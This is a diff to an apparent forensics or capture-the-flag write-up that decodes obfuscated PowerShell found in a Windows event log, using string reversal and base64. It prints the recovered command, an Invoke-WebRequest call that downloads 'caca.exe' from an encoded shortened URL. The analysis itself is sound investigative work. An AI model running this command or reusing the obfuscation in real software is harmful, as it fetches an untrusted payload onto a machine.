@@ -1,4 +1,4 @@
-![alt text](image-2.png)
+<img src=".images/he_did_what.png">
 
 In the `.evtx` file, I discovered very few PowerShell events which seemed obfuscated and suspicious. Putting the commands together results in:
 
@@ -9,9 +9,12 @@ $SCr = [SyStem.TexT.encODINg]::uTF8.GeTsTrInG([SYSteM.coNVErT]::froMBaSe64STrinG
 $w9r4pBoZlnfIzH1keCtX = $FBtFFDr8NXp5.ToCharArray() ; [array]::Reverse($w9r4pBoZlnfIzH1keCtX) ; -join $w9r4pBoZlnfIzH1keCtX 2>&1> $null ;
 $FBtFFDr8NXp5 = "=oQDiUGel5SYjF2YiASZslmR0V3TtASKpkiI90zZhFDbuJGc5MEZoVzQilnVIRWe5cUY6lTeMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1WoASayVVLgQ3clVXclJlYldVLlt2b25WS";
 ```
-To reverse the process, start by reversing the string. Then decode it in CyberChef using the `From Base64` function. This will reveal:
+To decode the value of `$FBtFFDr8NXp5`, I first reversed the string. Then decode it in CyberChef using the `From Base64` function. This will reveal:
 
-`Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag=="))) -OutFile "caca.exe"`
+```shell
+Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag=="))) -OutFile "caca.exe"
+```
+
 
 Here is again a Base64 string `aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag==` which after decoding becomes `https://shorturl.at/inyuj` .
 
